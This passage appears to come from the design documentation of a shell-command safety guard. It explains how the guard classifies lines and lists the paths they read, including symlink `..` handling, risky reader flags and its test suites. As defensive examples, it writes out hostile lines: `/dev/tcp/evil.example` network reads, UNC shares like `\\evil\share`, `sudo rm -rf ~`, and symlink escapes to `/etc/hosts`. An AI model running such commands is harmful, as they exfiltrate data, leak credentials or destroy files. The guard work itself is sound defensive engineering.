the workspace, and `effect_paths` lists it like any other.

- **What it holds** is what [What a line reads](#reach) lists: every operand
  and `<` source, a lister's folder, a `cd` target, the working directory
  when a reader reads it without being told, the root of a deep read (`rg TODO
  src` is `src`), the repository at the working directory or the folder `-C`
  chains, and a `git` revision or pathspec as `effect` places it (`git show
  HEAD:a.rs` also lists `a.rs`, from the working directory and from every
  workspace folder).
- **Absolute, with every `..` kept.** Each path is the one the system opens:
  the working directory after the `cd`s it follows, `~` expanded, `.` dropped, a
  Windows long path as the plain path it names, and every `..` left where the
  line wrote it. The case, the macOS names of the root volume
  (`/System/Volumes/Data`) and the links are left alone. It comes from core's
  `Resolver::opened`. A `\\?\` and a `FileSystem::` in front of a path are not
  part of a pattern.
- **Apply the `..` on the disk, after the link before it.** The kernel follows
  a link and then applies the `..` after it, so with `link -> /etc` in the
  workspace, `cat link/../etc/hosts` reads `/etc/hosts`. Folded by spelling it
  would be `<cwd>/etc/hosts`, inside, and a caller that checked that place
  would check the wrong one; so the list does not fold. A caller resolves each
  path component by component: follow a link when a name is one, step to the
  parent when it meets a `..` (`canonicalize` does exactly this, and a name
  that does not exist is put back below the nearest ancestor that does, a `..`
  after it removing the name before it). It must not apply the `..` by
  spelling first, and a prefix test on the path as listed is not a check:
  `<cwd>/../x` starts with the workspace and is not in it. `cat
  src/../README.md` still lets a caller confirm it stays inside: resolve it, and
  it is `<cwd>/README.md`. A `..` with nothing above it (`/..`) is dropped, as
  the kernel does. The `..` that a `cd` applies itself are the exception, and
  the shell does not always apply them: it applies a `..` by spelling and
  `chdir`s to the folded folder, but bash and zsh fall back to the path as
  written, the physical one, when the folded folder does not exist (dash and
  `/bin/sh` fail instead). So with `link -> /etc` and no `etc` beside `link`,
  `cd link/../etc` goes to `/etc`, and `cat hosts` after it reads
  `/etc/hosts`, while `<cwd>/etc` is where it goes when that exists. The
  shell checks the folder before every `..` that follows a part (`cd
  a/../nonexist/..` fails in bash, zsh and dash although the folded folder
  exists), so the check can fail only for a part that came after a `..` that
  climbed out of a part, anywhere in the text, whether or not the part is still
  there at the end (`link/../etc`, `link/../etc/..`, `a/../b/..`,
  `src/deep/../../x`). A folder with no part after such a `..` (`link/..`,
  `src/../..`) is a leading part of the text, which exists when the text does,
  and a `..` with nothing before it (`../x`) climbs from the folder the line is
  in, which is known. A later `cd ..` after a `cd` of the first kind counts as
  well (`cd link/../etc && cd ..` is the text `link/../etc/..`). So a `cd`
  target of the first kind is listed both ways: folded, as the folder the line
  moved to, and kept,
  as the target the system opens, and each read from that folder is listed from
  each, so a caller checks both (`cd link/../etc && cat hosts` lists
  `<cwd>/etc`, `<cwd>/etc/hosts`, `<cwd>/link/../etc` and
  `<cwd>/link/../etc/hosts`). A pattern in that folder is a read from it like
  any other, so `cd link/.. && cat *` lists `<cwd>` and `<cwd>` with
  `Glob("*")`: the shell expands the pattern in the folded folder, and a
  caller that resolved `<cwd>/link/..` on the disk would expand another one.
  Only a relative operand is joined to the folder: a
  path the line writes out whole (absolute, or `~`) is opened from its first
  part, even when it spells the folder, so `cd /w/link/.. && cat
  /w/link/../etc/hosts` lists only `/w/link/../etc/hosts` for the read. A `..`
  the program opens (`cd src && cat ../x`) is kept. A chain of such `cd`s lists
  all of them folded and all of them kept, not each mix. A line that keeps the
  physical path (`cd -P`) follows the link first for that `cd`, so its `..` are
  all kept; but the flag is the line's, and each `cd` has its own (the last of
  `-L` and `-P` wins, and a `cd` before the `-P` is logical), so such a line is
  listed both ways, the kept one beside the folded one, for every `cd`. On Windows the system folds a `..` before it looks at the disk, which
  resolving the path as the system does gives too. `effect`
  does not change: it judges the place by spelling, as before, so a `..`
  after a link is still a place inside the workspace there. A walk or a
  pattern keeps them too: the folder a pattern expands in is a path the shell
  opens (`link/../*.rs` is the folder `link/..` and `*.rs`), and a `..` in the
  rest of the pattern is the pattern's own, as written.
- **Sorted, each entry once**, so the answer is the same every time.
- **No path, not listed.** A read that is not a place on a disk has no path:
  the null device and other devices, a registry hive or another PowerShell
  drive, and a path on another drive's own working directory (`D:x` from `C:`).
  Each is judged by its place already (the null device is `Workspace`, the rest
  `Beyond`). `cat /dev/null` is `Some([])`, as `echo hi` is.
- **`Beyond` lines are listed too**, with every read, not only the one that
  made it `Beyond`.
- **Over-listing** is on the safe side: `cat '~/x'` lists the home folder's `x`
  (the guard reads the quoted `~` as home), `cat 0< x` lists a path `0`, and a
  git revision is listed as a path (`HEAD~1`).

`effect` costs what it did: the paths are collected only when `effect_paths`
asks, and `classify` is untouched.

### The readers

The table is short on purpose. A program not in it is `Unknown`. A reader that
takes a flag which writes is `Changes` when the flag is given; one that takes a
flag which runs another program, or can be handed one by an argument known only
when it runs, is `Unknown`.

| Shell | Reads only |
| --- | --- |
| POSIX | `ls`, `cat`, `head`, `tail`, `wc`, `stat`, `pwd`, `echo`, `printf`, `grep`, `egrep`, `fgrep`, `diff`, `du`, `df`, `which`, `realpath`, `basename`, `dirname`, `true`, `false`, `test`, `[`; `less`, `sort`, `file`, `rg`, `fd`, `find` and `git` with the care below; `cd`, `pushd` and `popd` when the guard follows them. |
| PowerShell | `Get-ChildItem`, `Get-Content`, `Select-String`, `Get-Item`, `Get-Location`, `Test-Path`, `Resolve-Path`, `Write-Output`, `Write-Host`, `Where-Object`, `Select-Object`, `Sort-Object`, `Measure-Object` and the aliases `cat`, `gc`, `type`, `sls`, `echo`, `pwd` (and `ls`, `dir`, `gci`, which `classify` already reads as `Get-ChildItem`); `git`; `Set-Location` when followed. |
| cmd | `dir`, `type`, `findstr`, `echo`; `git`; `cd` when followed. |

- GNU `sort`, `file` and `less` take any unambiguous prefix of a long option
  (`sort --outp=x` is `--output=x`, `file --comp` is `--compile`, `less
  --log=x` is `--log-file=x`). So a long option of theirs reads only when it
  is exactly one the guard names (`sort --reverse`, `file --brief`, `less
  --quit-if-one-screen`); a prefix of the option that writes is `Changes`
  (names compare without case, as `less` does), and any other is `Unknown`.
  The other readers have no long option that writes or runs a program, and `git`
  and `rg` refuse abbreviations.
- `sort -o` and `sort --output` write (`Changes`); `--compress-program` runs a
  program. `file -C` writes. `less -o`, `less -O` and `--log-file` write, `less -k`
  reads a lesskey file (whose `#env` section can set `LESSOPEN`), and an
  argument that starts with `+` is a `less` command. `rg --pre`, `rg
  --hostname-bin` and `rg -z` run a program; `fd -x` and `fd -X` run one.
  `printf -v NAME` sets a variable. All the others in the first group have no
  flag that writes or runs anything.
- `find` is `Changes` with `-delete`, `-fprint`, `-fprint0`, `-fprintf` or
  `-fls`. `-exec`, `-execdir`, `-ok` and `-okdir` are not a reason of their own:
  the program they run is a unit, as for `classify`, and is judged as one
  (`find . -exec cat {} +` reads only, `find . -exec rm {} +` changes).
- `git` is read for the subcommands `status`, `log`, `diff`, `show`, `blame`,
  `rev-parse` and `ls-files`, `remote` alone and `remote -v`, and `branch` and
  `tag` when they only list: every flag a listing one, and no operand that
  would create (`git branch topic` makes a branch; `git branch --list 'x*'`
  lists). `--output=FILE` writes. Each of the other reading subcommands has a
  list of the options it knows as reading ones, in `effect/git.rs`, and any
  other option is `Unknown` (`--ext-diff`, `--textconv`, `--help`, and any option
  added later); git refuses abbreviated long options, so a name matches
  exactly. `log`, `show` and `diff` share what they print about a change
  (`--stat`, `--name-only`, `-p`, `-w`, `-M`, `--color`, ...) and `log` and
  `show` what they walk (`--oneline`, `--graph`, `--decorate`, `--all`,
  `--author`, `--since`, `-n`, `-L`, ...); `status` has `-s`, `-b`,
  `--porcelain`, `-u`, `--ignored`; `blame` `-L`, `-w`, `-M`, `-C`, `-e`,
  `--porcelain`; `rev-parse` `--show-toplevel`, `--abbrev-ref`, `--git-dir`,
  `--verify`, `--short`; `ls-files` `-c`, `-d`, `-m`, `-o`, `-s`,
  `--exclude-standard`. Of these, the options that take a file are places: `blame
  --contents`, `--ignore-revs-file` and `-S`, `-O` and `--orderfile` on `diff`,
  `log` and `show`, and `ls-files -X` and `--exclude-from`; a value known only
  when it runs there is `Unknown`. An option that git takes with an optional
  value takes it only after `=` (`--pretty`, `--format`, `--date`, `--color`,
  `--stat`, `-U3`, `-M90%`, `-uno`): alone it takes nothing, so the next word is
  not swallowed. `log --show-signature` is not in the list, since it runs the
  `gpg.program` the repository's config names. `shortlog`, `describe`, `reflog`,
  `cat-file`, `ls-tree`, `grep`, `merge-base` and `rev-list` are not yet read, and
  are `Unknown`. The writing subcommands (`add`, `commit`, `push`, `checkout`, ...) are
  `Changes`, the rest `Unknown`. Only `-C`, `--no-pager`, `-P` and
  `--no-optional-locks` may come before the subcommand: `-c` and the others
  can make git run a command. What the repository's own config makes git run
  is not read, and a caller should know it: `diff.external` and textconv
  drivers (which `diff`, `show`, `log -p` and `blame` run on the files they
  show), `core.fsmonitor` (which `status` runs), and the lazy fetches of a
  partial clone (which any of them may make over the network). Each runs a
  program or touches the network from configuration the guard cannot see.
- Package managers and build tools (`cargo`, `npm`, `pip`, `make`, `brew`,
  `dotnet`, ...) are `Changes` whatever their subcommand.
- A program named with a folder is the program the shell finds by that name
  only in a system folder (`/bin`, `/usr/bin`, `/usr/local/bin`,
  `/opt/homebrew/bin`): `./cat`, `bin/ls` and `/tmp/x/ls` are `Unknown`, as are
  `cat.bat` and, in a POSIX shell, `ls.exe`.
- A variable the line sets or unsets makes it `Unknown`: `PATH=. ls`, `env
  PATH=. ls`, `env -u PATH ls`, `export PATH=...`, `GIT_PAGER=x git log`, and
  in PowerShell and cmd any assignment (`$env:PATH = ...`, `set X=1`). A
  language or a display setting is let through (`LC_ALL=C sort`, `LANG`, `TZ`,
  `TERM`, `COLUMNS`, `LINES`, `NO_COLOR`). A `for` loop's own variable is not a
  setting, unless its name could be one that changes what runs (`PATH`, or in
  zsh `path`).
- A PowerShell method call (`[IO.File]::ReadAllText(...)`, `$x.Delete()`) is
  no unit, and the rules know only some of them: it is `Unknown`, also when a
  rule reads it as the cmdlet it stands for (a `Get-Content` for a .NET read
  of a file, an `Invoke-RestMethod` for an upload). A backtick
  substitution in an unquoted here-document, which the grammar does not read
  and the shell runs, is read as code by the guard (see Data in a database),
  so it counts for what its commands do, and for `Unknown` when it cannot be
  read.
- **A path known only when it runs makes the line `Unknown`.** A reader's file
  operand or the source of a `<` redirect (`cat $f`, `cat < "$F"`, `cat
  "$(pwd)/x"`, `grep x "$f"`, `type %X%`, `Get-Content $x`, `cat ~root/x`) may
  name anything, a network device or a share included, and what cannot be read
  is not reads-only. The paths the guard names stay known: `~`, `$HOME`,
  `$TMPDIR`, `$env:TEMP` and the other forms [Core](core.md) resolves, and a
  glob, which is a pattern over known folders (`cat *.rs` reads only).
- **Only a path is judged as a path.** Each reader's table entry says which
  arguments the program opens as files. A pattern, a count or an author is
  data: `grep -rn "$PATTERN" .`, `rg "$x" src`, `head -n "$N" x`, `sort -k
  "$K" x` and `git log --author="$NAME"` read only. For `grep` and `rg` the
  first operand is the pattern, unless `-e` or `-f` gives it (`-f FILE` and
  `rg --ignore-file FILE` are paths, and so is every operand of `rg --files`);
  a value of an option that takes one is data, unless the option takes a file;
  for `find`, the places are the arguments before the first test, and the
  value of `-name` and the like is data. For `git`, the places are the value
  of `-C`, what comes after `--`, and every operand of `--no-index`; the other
  operands are revisions and pathspecs inside the work tree, which git does
  not take outside it. A value counts as data only when it is known or every
  expansion in it is in double quotes: unquoted, `$x` splits into more
  arguments, options among them, and is an operand. An operand known only when
  it runs is `Unknown` for `git`, since it could be an option. What stays
  open: a quoted pattern or value could itself start with `-` and be read as an
  option.
- **Switches and options that name a file or folder are places too.** In cmd,
  `findstr` takes its switches with `/` or `-` (`/f:file`, `-f:file`) and runs
  letters together after one prefix, the one that takes a value last (`/smf:file`,
  `-if:file`); `/s/b` is two runs. A switch is never an operand. A run with a
  letter `findstr` does not know, or a value switch that is not last, makes the
  line `Unknown`. Three switches name files: `/G:file` holds the search
  strings and `/D:dir;dir` the folders to search (a list split at `;`), and
  their values are places; `/F:file` is a list of files to open, which the
  guard never sees, so it is `Unknown` whatever it names. `/C:string` and
  `/A:attr` are data. With `/G:` or `/C:` every operand is a file, where
  otherwise the first operand is what to search for (one known only when it
  runs could be a switch, so it is a place). `dir`'s `/A:`, `/O:` and `/T:` are
  data, and `type` has no switch. `//server/share` is no switch.
- **An option that reads its list of files to open from another file is
  `Unknown`, whatever its value**, since the list could name a share:
  `findstr /F:`, `wc` and `du` and `sort` `--files0-from`, `file -f` and
  `--files-from`, `find -files0-from`, and `xargs -a` and `--arg-file`. An
  option whose file holds patterns, not paths, is read as a place only:
  `grep -f`, `rg -f`, `findstr /G:`. Of GNU's other long options, `diff
  --from-file` and `--to-file`, `grep` and `rg` `--file`, `du` and `diff`
  `--exclude-from`, `sort --random-source` and `realpath --relative-to` name a
  file, and the file is a place.
- In PowerShell, `-Path` and `-LiteralPath` (`Get-ChildItem`, `Get-Item`,
  `Get-Content`, `Select-String`, `Test-Path`, `Resolve-Path`) and
  `Resolve-Path -RelativeBasePath` are places; `-Filter`, `-Include`,
  `-Exclude`, `-Stream`, `-Encoding`, `-Delimiter`, `-Tail`, `-TotalCount`,
  `-Pattern`, `-PathType` and `-OlderThan` are not. None of the readers in the
  cmd and PowerShell tables has a switch that writes; `sort /O`, `more`,
  `where` and `find` of cmd are not in them and are `Unknown`.
- **An option never swallows an option.** Whenever a reader's option takes
  its value from the next word and that word starts with `-` (a number such as
  `head -n -5` is a value), the line is `Unknown`, in every reader's option
  parser, so an option listed as taking a value that git or another program
  also takes bare can never hide a real option behind it.
- **PowerShell quotes inside a word are taken off as PowerShell takes them**
  before the word is judged: `--contents="\\evil\s"` reaches the program as
  `--contents=\\evil\s`, and a doubled quote inside quotes of its kind is one.
- **A pipeline into a reader** (`xargs cat`, and in PowerShell `Get-Item`,
  `Get-ChildItem`, `Test-Path`, `Resolve-Path`, `Get-Content` and `Select-String`
  with no path of their own) hands it paths, so the stage before it must list
  known places: `ls`, `fd`, `dir`, `Get-ChildItem`, `git ls-files`, or a `find`
  that prints only what it finds (`-printf` and `-exec` print any text), through
  stages that only select or order (`head`, `tail`, `sort`, `grep` with no file
  of its own; `Where-Object`, `Sort-Object` and `Select-Object -First`, with no
  `-Property`). `ls | xargs cat` and `Get-ChildItem | Get-Content` read only;
  `echo a | xargs cat` and `'\\evil\share' | Test-Path` do not. A
  `Select-String` also takes the text of `Get-Content` or another search.
  Programs that only print their operands (`echo`, `printf`, `basename`, `test`,
  `Write-Output`) are not readers of them.
- **A `for` over words written out** (no expansion in the list) is read with
  each word in place of the variable, as if the body were written out, the
  network check included: `for f in *.txt; do wc -l "$f"; done` reads only,
  `for f in /dev/tcp/h/80; do cat $f; done` does not. A glob stands for itself.
  Not read this way, so `Unknown`: a list with an expansion (`for f in $(ls)`),
  no list (`for f; do`), a body that sets the variable (assignment, `unset`,
  `read`, `((`, `${f:=}`, a loop of the same name) or defines a function, a
  variable in the program's own name, and a `<` redirect in the body. More than
  64 combinations of words are not read either.
- A read that contacts the network is `Unknown`, judged on the path's known
  value after quotes are resolved, never on its spelling. Every reader's
  arguments get that check, and so does every value inside one: after the
  `=` of a long option or the `:` of a switch, and attached to a short option
  (`-O//evil/s/x`, `--exclude-from=\\evil\s\x`, `/a:\\evil\s`), so the option
  nobody listed is caught too. Only the spelling of a share or a device is
  checked in a value, not whether it is known: `--author="$NAME"` still reads
  only. In PowerShell a variable inside a bare token (`--contents=$p`) is
  expanded, so such a value is a path known only when it runs. The names are: a path naming bash's
  `/dev/tcp/HOST/PORT` or `/dev/udp/HOST/PORT`, as an operand or as the source
  of a `<` redirect (`cat < /dev/tcp/evil.example/80`; a spelling that hides
  it, such as `/dev/$'\x74'cp/...` or `/dev/${X}tcp/...`, is a path known only
  when it runs); and in PowerShell and cmd a UNC path (`\\server\share`,
  `//server/share`, `\\?\UNC\server\share`, `\\.\UNC\server\share`,
  and `GLOBALROOT` after `\\?\` or `\\.\`, which reaches the share through
  the device namespace), which offers the user's credentials to the server. A
  long path or device that is a disk (`\\?\C:\x`, `\\.\PhysicalDrive0`) is
  not a share. Repeated separators and `.` parts are folded as Windows folds
  them (`\\.\\UNC\host\share`), and a path with `..` in its root counts. Core
  reads that spelling (`spelling::network`), the file guard's `network_share`
  too. A `<` redirect is read in cmd too, with a handle in front (`0<`).
- Not read, so the caller has to account for them: an alias or function
  defined outside the line, the `PATH` the shell runs with, and an option set
  by a start-up file. A name in the table is taken to be the program that
  name means.
- `echo` and `printf` count as reading: with no redirect they change nothing.
  `echo hi > out.txt` is `Changes` through its redirect.

`effect` is an enum of its own and not a field of an explanation of the line.
It is exhaustive, as `Rule` is and for the same reason: the three answers are
the whole question, and a fourth would change what a caller's gate means by
"reads only", so it must break every caller's `match` at compile time. (A
caller that only asks whether `effect(..)` is `ReadsOnly(_)` is unaffected by one.)

## Explaining a line

```rust
explain(line, shell, &paths) -> Explanation
```

When a line comes out wrong, the reason is in the split, which is private.
`explain` returns it: every unit as the rules saw it (the program as written, the
arguments (a known one with its quotes taken off, an unknown or template one as
written), where each argument would land if read as a path, the
folder it runs from after a `cd`, the wrappers taken off, the shell and the
nesting depth it came from, its stage in a pipeline; a part of the line the
grammar reads again, like what follows the `&&` in cmd's `set X=1 && del y`,
counts one level, as the depth limit does) with the findings that
unit produced, each redirect's write the same way, and the findings of the line
itself (a part that cannot be read, a program known only when it runs, a limit
hit). Every known argument that is not an option gets a place, whether or not
the program takes it as a path (`reset` in `git reset` lands inside the
workspace); which arguments are paths is the rules' business, not the tree's.

`classify` is `explain` without the tree: both take their answer from one
reading of the line (`effect` too, from the same split), so `Explanation::findings`
is what `classify` reports, and a test holds them equal for every row of the
tables. `Explanation` implements `Display` as a short indented tree. It builds
the string and prints nothing, so the contract test over `src/` still passes.

The example in the shell crate prints that tree. It is the one place that reads
arguments and prints, and it lives outside `src/`:

```text
cargo run -p milo-guards-shell --example explain -- \
    --shell posix --cwd /work/app --home /home/me --workspace /work/app \
    'sudo rm -rf ~ && bash -c "git reset --hard"'
```

`--shell` is `posix` (the default), `powershell` or `cmd`; `--workspace` can be
repeated. A caller gets `explain` as `milo_guards::shell::explain`
through the front door, which has no logic and no example of its own.

## Tests

The tests are cases, one file for each thing they check, named by it (the
rule is in [Guidelines](../../GUIDELINES.md#tests)): `tests/cases/posix.cases`
for POSIX lines and `tests/cases/windows.cases` for PowerShell and cmd, checked
by `tests/posix.rs` and `tests/windows.rs`, and beside them a file for each
part of the guard (`cd`, `posix_wildcards`, `stop_processes`, `drop_data`,
`here_documents` and the rest), its plain cases in a case file of its name
(the format is in [CONTRIBUTING.md](../../CONTRIBUTING.md#case-files)), and
what is made in a loop or checks a structure in the Rust file beside it,
built on core's test kit. Each case is a line and
the answer it must get: safe, or the rules it must find. A new rule comes with
cases of both kinds, and a fix adds cases to the file of what it checks. The everyday lines that must stay safe go through
the front door: `crates/guards/tests/everyday.rs` reads them from its
`tests/cases/everyday.cases` with this guard's runner, which holds each of
them to the same agreement checks.

`tests/cases/inline.cases` is the same for inline Python and JavaScript, with
the lines that are safe, what each rule finds and what stays `unknown`; the
`inline_*.cases` files beside it hold how code reaches an interpreter, the
names and modules the reader follows, what is read whole, file calls, started
programs, reads of a key and the working directory of the code, each checked
by the test file of its name. `tests/inline.rs` keeps the path a finding names,
code nested past the limit and the timed test, and `tests/inline_names.rs`
the chains of names and the lines of many strings it makes. They judge lines
through the reader; the reader's own tables (the acts a piece of code gives,
what is understood) are in `crates/code/tests`, see [Code](code.md#tests).
`tests/cases/inline_off.cases` holds every inline line to `unknown` with the
feature off; its test file, `tests/inline_off.rs`, is only compiled there
(`just no-inline`), and `tests/cases.rs` does not count a line of it that has
the same answer in a case file of the other build as a repeat.

`tests/cases/effect.cases` is the same for `effect`: a section of lines for each
answer, checked by `tests/effect.rs`, which keeps the lines made long or nested
deep. Every
case also goes through `effect`: the runner of the case files does it for
each case, the shared `check` for each row of a table, and the tests that
name a finding's target judge their lines with the shared `classify` of
`tests/common`, which does it too. A line `classify` finds risky for anything but an elevation or a
read of a key must not be `ReadsOnly`. The same check runs `explain` over each
row: its findings and assessment must be `classify`'s, and its tree must show
every finding. `tests/explain.rs` holds what `explain` shows.

`tests/cases/read_secret.cases` holds the cases of `read_secret`: the everyday
lines that stay safe, a line for every program the rule knows, a redirect, a
listing piped into a reader, every spelling of a key in a POSIX shell, on a
Mac, in PowerShell and in cmd, and what the kernel serves; its cases go
through the same `effect` check. `tests/cases/send_secret.cases` holds the
cases of `send_secret`. The
front door's
`crates/guards/tests/agree.rs` holds the shell and the file guard to one
answer (see [Reading a key](#reading-a-key)).

`tests/cases/reach.cases` has the cases of `Reach` for a POSIX line, read in a
workspace with nothing protected, from other working directories, in one with
a protected `.agent`, one that is the home folder and one that holds a folder
of logins, and `tests/cases/reach_windows.cases` the same for PowerShell and
cmd; the plain readers of the plain workspace are in `tests/cases/effect.cases`,
and core's `reaches_secret` has its own in
`crates/core/tests/cases/reaches_secret.cases`.
`tests/paths.rs` has the rows of `effect_paths`, in POSIX, PowerShell and cmd, and
one that checks every way of reading against a table of links playing the disk,
the way the docs tell a caller to;
`tests/paths_links.rs` has the rows of the `..` the list keeps (a link before a
`..`, every way of reading, a `cd` listed folded and kept, an absolute operand
after a `cd`, PowerShell and cmd), and `tests/cases/paths_links.cases` the
lines `effect` still judges by spelling; and
every case of every case file and every row of every table is also held to
agree with `effect` on whether it has a list (`common::path_disagreement`). Core's `absolute` has its own in
`crates/core/tests/cases/absolute.cases`, and `opened` in
`crates/core/tests/cases/opened.cases`.
`tests/names.rs` walks `Rule::ALL` and checks the wire names, that each rule is
listed once, and that the trait gives the same name as the method. Its list of
expected names is a `match` with no fallback arm, so a new rule does not compile
until it is named there. Three files feed the guard random and extreme lines and
check what no line may do to it, for each of the three shells. `tests/robust.rs`
holds seeded noise that never panics, a line too long or too nested being
unreadable, a line whose nested scripts are read too often being unreadable,
too many here-documents, a too-long cmd chain and too-deep nesting not being
read while everyday lines with many `<<` or `&` are, and the tests that time
a nasty line against a 200 ms bound;
`tests/timing.rs` and `tests/limits.rs` hold the rest, as each bullet says:

- **Never panics, and `classify`, `effect` and `explain` agree.** (The wide run
  is `wide_random_lines_never_panic_and_stay_quick` in `tests/timing.rs`;
  `tests/robust.rs` keeps the narrower `random_lines_never_panic`.) Thousands of
  seeded random lines (a small linear congruential generator, so a failure
  names its seed) joined from a wide set of pieces: quotes, substitutions and
  brackets left open, here-documents with no end, here-strings, NUL, a line cut
  through a character or with bytes no text holds read back lossily, and
  PowerShell and cmd metacharacters. The same noise goes through `effect` and
  `explain`, which must agree with `classify`.
- **A line left open is risky, and a delete is never safe.** (In `tests/limits.rs`.) Safe is a verdict
  the guard has to earn, so the tests say what a safe line may be, apart from
  the guard. A line of plain words, separators and one delete (written for the
  shell) is never safe: nothing in it can make the delete inert. A line of
  plain words that ends in a quote, substitution, bracket or here-document left
  open, or an operator with nothing after it, is never safe either, unless its
  shell reads that ending as a plain word: the test keeps a list of those per
  shell (cmd has no single quotes or backticks; PowerShell's grammar reads `<<`
  as a word, though PowerShell itself refuses the line, so nothing runs), and
  a table pins both sides. That a line is read at all is not the
  claim: a program the guard does not know is safe.
- **A line too long or too nested comes back unreadable** (and `Unknown` for
  `effect`). (In `tests/robust.rs`; `tests/limits.rs` measures where the edges
  are.)
- **The time.** (In `tests/timing.rs`, which runs its tests one at a time, and
  in a binary of its own: cargo runs test binaries one after another, so no
  heavy test shares the machine with a clock. The three bounded at 200 ms in
  `tests/robust.rs` stay there.) The worst of the random lines, and a line at the length limit
  in each of fourteen shapes in each shell (a chain, a pipeline and a
  conjunction with each shell's own separator: `;` is no separator in cmd, `&`
  is), classify and give `effect` within a bound that holds in the debug build
  `just verify` runs (500 ms and 2 s). In a release build the longest takes
  under 100 ms, and most are far quicker. Lines that made `find -exec` build
  gigabytes (a place of 25,000 bytes and an argument of 17,000 `{}`), and
  ones of several levels, are timed the same.
- **The limits.** (In `tests/limits.rs`, another binary of its own, for the
  same reason: each search reads many long lines.) The table above, found by measuring and held on both sides:
  the longest line, the deepest bracket nesting for each opener in each shell,
  the most shells in shells, wrappers in front of a program, finds in finds,
  here-documents started on a line, the `find -exec` work (in places, at a
  fixed weight), brackets still open and cmd's `&` and `|` that still read:
  the last two inside a string, where the grammar sees no nesting, so the count
  alone is measured. One past each is unreadable, so a later
  change to a limit, or to how deep a grammar nests, fails loudly. `find`s
  eight places wide and sixteen deep, and five thousand deep, are unreadable
  and return at once.
